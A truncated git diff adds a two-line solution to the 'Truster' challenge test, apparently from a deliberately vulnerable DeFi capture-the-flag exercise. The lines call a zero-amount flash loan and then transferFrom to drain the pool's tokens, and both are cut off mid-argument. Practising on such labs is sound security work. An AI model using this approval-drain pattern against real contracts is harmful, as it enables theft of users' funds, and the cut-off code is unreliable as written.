@@ -23,6 +23,8 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+	 await pool.connect(player).flashLoan(0,player.addr>
+        await token.connect(player).transferFrom(pool.addr>
     });
 
     after(async function () {
